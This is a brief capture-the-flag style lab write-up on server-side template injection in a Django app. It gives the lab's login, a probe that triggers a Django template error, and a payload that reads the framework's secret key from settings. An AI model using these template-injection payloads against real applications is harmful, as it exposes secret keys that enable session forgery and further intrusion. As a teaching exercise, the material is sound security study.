# Description

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:

`content-manager:C0nt3ntM4n4g3r`

# Solution

Payload:
```
{{7*7}}
```
Triggers and error:
```
#### Internal Server Error

Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'
```

It is django and Jinja2 template engine
## Final payload

To steal framework secret keya:
```
{{settings.SECRET_KEY}}
```

